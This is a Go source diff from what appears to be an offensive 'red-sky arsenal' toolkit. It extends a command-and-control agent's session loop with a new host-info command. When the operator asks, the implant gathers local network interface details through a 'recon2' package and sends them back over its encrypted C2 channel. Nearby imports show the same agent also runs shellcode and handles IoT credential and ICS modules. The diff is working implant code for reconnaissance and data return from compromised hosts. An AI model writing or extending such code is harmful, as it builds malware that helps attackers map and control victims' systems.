@@ -37,6 +37,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
 	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
+	"github.com/sk666G/red-sky---arsenal/internal/recon2"
 	"github.com/sk666G/red-sky---arsenal/internal/shellcode"
 	"github.com/sk666G/red-sky---arsenal/internal/socialgo"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
@@ -314,6 +315,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runShellcode(conn, sess, sc)
+		case proto.TypeHostInfoStart:
+			var h proto.HostInfoStart
+			if err := json.Unmarshal(env.Payload, &h); err != nil {
+				continue
+			}
+			go runHostInfo(conn, sess, h)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1924,4 +1931,31 @@ func runShellcode(conn net.Conn, sess *crypto.Session, sc proto.ShellcodeStart) 
 
 	send(d)
 	send(proto.ShellcodeData{SessionID: sc.SessionID, Done: true})
+}
+
+// runHostInfo answers a host-info request with the local interface picture.
+func runHostInfo(conn net.Conn, sess *crypto.Session, h proto.HostInfoStart) {
+	info, err := recon2.Grab()
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeHostInfoData, proto.HostInfoData{
+			SessionID: h.SessionID,
+			Error:     err.Error(),
+			Done:      true,
+		})
+		return
+	}
+	blob, err := info.MarshalJSONBlob()
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeHostInfoData, proto.HostInfoData{
+			SessionID: h.SessionID,
+			Error:     err.Error(),
+			Done:      true,
+		})
+		return
+	}
+	sendTunnelAck(conn, sess, proto.TypeHostInfoData, proto.HostInfoData{
+		SessionID: h.SessionID,
+		JSON:      string(blob),
+		Done:      true,
+	})
 }
